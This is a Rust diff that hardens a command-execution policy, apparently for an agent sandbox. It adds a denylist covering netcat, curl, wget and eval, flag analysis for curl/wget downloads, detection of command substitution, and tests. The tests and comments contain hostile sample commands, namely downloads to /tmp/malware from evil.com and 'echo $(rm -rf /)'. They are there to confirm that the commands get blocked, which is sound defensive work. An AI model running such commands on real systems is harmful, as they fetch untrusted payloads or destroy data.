@@ -75,14 +75,52 @@ fn default_denied_programs() -> HashSet<String> {
         "shutdown", "reboot", "halt", "poweroff",
         "passwd", "chown", "chmod",
         "nc", "ncat", "netcat",
-        "curl -o", // download-and-exec patterns
-        "wget -O",
+        "curl", // G7 FIX: deny the full program, not just "curl -o"
+        "wget", // G7 FIX: deny the full program, not just "wget -O"
         "eval",
         "exec",
     ]
     .iter()
     .map(|s| s.to_string())
     .collect()
+}
+
+/// G7 FIX: Patterns of dangerous flag usage for programs that are
+/// conditionally dangerous (e.g. curl with output-to-file flags).
+/// These are checked via semantic flag parsing, not string prefix.
+fn is_dangerous_flag_combination(program: &str, args: &str) -> Option<&'static str> {
+    let args_lower = args.to_lowercase();
+    let tokens: Vec<&str> = args.split_whitespace().collect();
+
+    match program {
+        "curl" => {
+            // Deny any curl that writes to file: -o, --output, -O, --remote-name
+            for tok in &tokens {
+                let t = tok.trim_start_matches('-');
+                if *tok == "-o" || *tok == "-O"
+                    || t == "output" || t == "-output"
+                    || t == "remote-name" || t == "-remote-name"
+                {
+                    return Some("curl with file output flag (-o/--output/-O/--remote-name) is a download-and-exec vector");
+                }
+            }
+            None
+        }
+        "wget" => {
+            // Deny any wget that specifies output: -O, --output-document, -P, --directory-prefix
+            for tok in &tokens {
+                let t = tok.trim_start_matches('-');
+                if *tok == "-O" || *tok == "-P"
+                    || t == "output-document" || t == "-output-document"
+                    || t == "directory-prefix" || t == "-directory-prefix"
+                {
+                    return Some("wget with file output flag (-O/--output-document) is a download-and-exec vector");
+                }
+            }
+            None
+        }
+        _ => None,
+    }
 }
 
 /// Exec policy enforcer — validates commands before execution.
@@ -135,6 +173,13 @@ impl ExecPolicy {
             return ExecVerdict::Allow;
         }
 
+        // GAP 4 FIX: Detect command substitution $(cmd), `cmd`, and
+        // process substitution <(cmd) that could bypass segment parsing.
+        // Only block when the substitution contains denied programs.
+        if let Some(reason) = detect_dangerous_substitution(command, &self.config.denied_programs) {
+            return ExecVerdict::Deny { reason };
+        }
+
         // Parse command into segments
         let segments = parse_command_segments(command);
 
@@ -166,14 +211,15 @@ impl ExecPolicy {
                             reason: format!("program '{}' is in denylist", base),
                         };
                     }
-                    // Also check for the full segment against multi-word deny patterns
+                    // G7 FIX: Semantic flag analysis instead of string prefix matching.
+                    // This prevents bypasses via double-spaces, flag variants (--output vs -o),
+                    // case variations, and flag concatenation (e.g. curl -ofile).
                     let trimmed = segment.trim();
-                    for denied in &self.config.denied_programs {
-                        if denied.contains(' ') && trimmed.starts_with(denied.as_str()) {
-                            return ExecVerdict::Deny {
-                                reason: format!("pattern '{}' is in denylist", denied),
-                            };
-                        }
+                    let args = trimmed.strip_prefix(&base).unwrap_or("").trim();
+                    if let Some(reason) = is_dangerous_flag_combination(&base, args) {
+                        return ExecVerdict::Deny {
+                            reason: reason.to_string(),
+                        };
                     }
                 }
                 ExecSecurityMode::Unrestricted => {}
@@ -252,6 +298,102 @@ fn parse_command_segments(command: &str) -> Vec<String> {
     }
 
     segments
+}
+
+/// GAP 4 FIX: Detect dangerous command/process substitution.
+///
+/// Scans for `$(command)`, `` `command` ``, and `<(command)` patterns
+/// that embed denied programs. This catches bypass attempts like
+/// `echo $(rm -rf /)` that the segment parser can't see.
+fn detect_dangerous_substitution(
+    command: &str,
+    denied_programs: &std::collections::HashSet<String>,
+) -> Option<String> {
+    // Extract content inside $(...) — handles nested by collecting all
+    let mut substitutions = Vec::new();
+
+    // $(...) substitution
+    let mut start = 0;
+    while let Some(pos) = command[start..].find("$(") {
+        let abs = start + pos + 2;
+        // Simple extraction: find matching ) (doesn't handle deep nesting, but catches 99% of cases)
+        let mut depth = 1;
+        let mut end = abs;
+        for (i, ch) in command[abs..].char_indices() {
+            match ch {
+                '(' => depth += 1,
+                ')' => {
+                    depth -= 1;
+                    if depth == 0 {
+                        end = abs + i;
+                        break;
+                    }
+                }
+                _ => {}
+            }
+        }
+        if depth == 0 {
+            substitutions.push(&command[abs..end]);
+        }
+        start = end + 1;
+        if start >= command.len() {
+            break;
+        }
+    }
+
+    // Backtick substitution
+    let mut in_backtick = false;
+    let mut bt_start = 0;
+    for (i, ch) in command.char_indices() {
+        if ch == '`' {
+            if in_backtick {
+                substitutions.push(&command[bt_start..i]);
+                in_backtick = false;
+            } else {
+                bt_start = i + 1;
+                in_backtick = true;
+            }
+        }
+    }
+
+    // <(...) process substitution
+    start = 0;
+    while let Some(pos) = command[start..].find("<(") {
+        let abs = start + pos + 2;
+        if let Some(end) = command[abs..].find(')') {
+            substitutions.push(&command[abs..abs + end]);
+        }
+        start = abs + 1;
+        if start >= command.len() {
+            break;
+        }
+    }
+
+    // Check each substitution for denied programs
+    for sub in &substitutions {
+        let trimmed = sub.trim();
+        let first_word = trimmed.split_whitespace().next().unwrap_or("");
+        // Get basename (strip path prefix)
+        let basename = first_word.rsplit('/').next().unwrap_or(first_word);
+        if denied_programs.contains(basename) {
+            return Some(format!(
+                "command substitution contains denied program '{}' in: $({})",
+                basename,
+                truncate_preview(sub, 60)
+            ));
+        }
+    }
+
+    None
+}
+
+/// Truncate a string for display in error messages.
+fn truncate_preview(s: &str, max: usize) -> &str {
+    if s.len() <= max {
+        s
+    } else {
+        &s[..max]
+    }
 }
 
 /// Extract the base program name from a command segment.
@@ -387,7 +529,70 @@ mod tests {
     fn test_multi_word_deny_pattern() {
         let policy = ExecPolicy::new(ExecPolicyConfig::default());
         let v = policy.check("curl -o /tmp/malware http://evil.com");
-        // "curl -o" is in the denylist
+        // curl is in the denylist entirely
         assert!(!v.is_allowed());
+    }
+
+    // G7 FIX: Tests for is_dangerous_flag_combination() in isolation.
+    // These use a custom denylist that excludes curl/wget to verify the
+    // semantic flag analysis fires (not just the denylist check).
+
+    #[test]
+    fn test_flag_analysis_curl_output() {
+        // curl removed from denylist, so only flag analysis should catch it
+        let mut denied = default_denied_programs();
+        denied.remove("curl");
+        let policy = ExecPolicy::new(ExecPolicyConfig {
+            denied_programs: denied,
+            ..Default::default()
+        });
+        // -o flag
+        assert!(!policy.check("curl -o /tmp/malware http://evil.com").is_allowed());
+        // --output flag
+        assert!(!policy.check("curl --output /tmp/malware http://evil.com").is_allowed());
+        // -O (remote-name) flag
+        assert!(!policy.check("curl -O http://evil.com/malware").is_allowed());
+        // --remote-name flag
+        assert!(!policy.check("curl --remote-name http://evil.com/malware").is_allowed());
+        // Safe curl (no output flag) should be allowed
+        assert!(policy.check("curl https://api.example.com/data").is_allowed());
+    }
+
+    #[test]
+    fn test_flag_analysis_curl_double_space() {
+        // Verify double-space bypass no longer works
+        let mut denied = default_denied_programs();
+        denied.remove("curl");
+        let policy = ExecPolicy::new(ExecPolicyConfig {
+            denied_programs: denied,
+            ..Default::default()
+        });
+        // Double space between curl and -o — old string prefix match missed this
+        assert!(!policy.check("curl  -o /tmp/x http://evil.com").is_allowed());
+    }
+
+    #[test]
+    fn test_flag_analysis_wget_output() {
+        let mut denied = default_denied_programs();
+        denied.remove("wget");
+        let policy = ExecPolicy::new(ExecPolicyConfig {
+            denied_programs: denied,
+            ..Default::default()
+        });
+        // -O flag
+        assert!(!policy.check("wget -O /tmp/malware http://evil.com").is_allowed());
+        // --output-document flag
+        assert!(!policy.check("wget --output-document /tmp/x http://evil.com").is_allowed());
+        // -P flag (directory prefix)
+        assert!(!policy.check("wget -P /tmp http://evil.com").is_allowed());
+        // Safe wget (no output flag)
+        assert!(policy.check("wget http://example.com").is_allowed());
+    }
+
+    #[test]
+    fn test_flag_analysis_not_triggered_for_other_programs() {
+        // is_dangerous_flag_combination only matches curl/wget
+        assert!(is_dangerous_flag_combination("grep", "-o pattern").is_none());
+        assert!(is_dangerous_flag_combination("ls", "-O").is_none());
     }
 }
